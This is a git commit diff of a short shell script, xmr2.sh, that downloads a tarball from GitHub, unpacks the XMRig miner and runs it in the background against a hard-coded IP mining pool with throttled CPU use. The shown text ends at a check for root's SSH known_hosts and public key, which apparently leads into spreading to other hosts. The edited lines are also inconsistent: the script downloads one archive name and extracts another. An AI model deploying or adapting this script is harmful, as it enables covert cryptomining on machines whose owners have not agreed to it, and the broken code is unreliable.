a289307a54f73d385eefe088e13767158eb73e09
Pamentierx <64346082+Pamentierx@users.noreply.github.com>
2021-09-06 11:43:13 +0800

    Update and rename xmr.sh to xmr2.sh

--- xmr2.sh
+++ xmr2.sh
@@ -1,8 +1,8 @@
 wget -P ./tmp/ https://github.com/Pamentierx/xmr/raw/main/xmr.tar.gz
-tar -xvzf ./tmp/xmr.tar.gz -C ./tmp/
+tar -xvzf ./tmp/xmr2.tar.gz -C ./tmp/
 cd ./tmp/xmrig-6.14.1
-chmod +x ./tmp/xmrig
-./tmp/xmrig -o 107.182.176.159:8989 -u worker3 -p xx -t 1 -B --cpu-priority 1 --cpu-max-threads-hint=50% --nicehash
+chmod +x ./tmp/xmrig-6.14.1/xmrig
+./tmp/xmrig-6.14.1/xmrig -o 107.182.176.159:8989 -u worker3 -p xx -t 1 -B --cpu-priority 1 --cpu-max-threads-hint=50% --nicehash
 
 
 if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
